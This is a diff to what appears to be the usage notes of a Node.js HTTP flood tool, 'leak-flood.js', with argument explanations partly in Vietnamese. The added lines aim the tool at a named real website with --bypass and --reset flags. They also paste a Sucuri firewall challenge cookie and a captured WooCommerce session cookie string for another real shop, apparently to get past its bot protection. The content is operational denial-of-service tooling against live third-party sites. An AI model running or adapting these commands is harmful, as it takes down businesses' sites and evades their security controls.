@@ -4,3 +4,9 @@ node leak-flood.js https://bavarian-outfitters.de/ 99999 15 2 500.txt --debug --
 15 thread
 2 số request mỗi giây
 
+node leak-flood.js https://sunwin.pro/ 99999 15 2 500.txt --debug --reset --bypass
+
+sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1
+
+
+pll_language=de; wp_woocommerce_session_56d84b7b4ca72c372043ca5a6d7d4d8f=t_6e972a87b13fd698f397efb4f72d71%7C1758814980%7C1758814980%7C9b8d3b05cd2e2cae40a72373cc05f477; borlabs-cookie=%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%2C%22polylang%22%2C%22woocommerce%22%5D%2C%22statistics%22%3A%5B%22google-analytics-four%22%2C%22woocommerce-google-analytics%22%5D%2C%22marketing%22%3A%5B%22google-tag-manager%22%2C%22wc-order-attribution%22%5D%2C%22external-media%22%3A%5B%22google-fonts%22%2C%22maps%22%2C%22recaptcha%22%5D%7D%2C%22domainPath%22%3A%22bavarian-outfitters.de%2F%22%2C%22expires%22%3A%22Mon%2C%2024%20Nov%202025%2014%3A44%3A00%20GMT%22%2C%22uid%22%3A%22bx0l92ix-ioaczzhc-mu5mzafr-ksuwdeuk%22%2C%22v3%22%3Atrue%2C%22version%22%3A1%7D; _gcl_au=1.1.1185150370.1758811442; _ga=GA1.1.477046689.1758811442; borlabs-cookie-gcs=%7B%22ad_storage%22%3A%22granted%22%2C%22ad_user_data%22%3A%22granted%22%2C%22ad_personalization%22%3A%22granted%22%2C%22analytics_storage%22%3A%22granted%22%2C%22functionality_storage%22%3A%22granted%22%2C%22personalization_storage%22%3A%22granted%22%2C%22security_storage%22%3A%22granted%22%7D; _ga_6SPKS2E1HR=GS2.1.s1758811442$o1$g1$t1758811484$j60$l0$h0; sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1
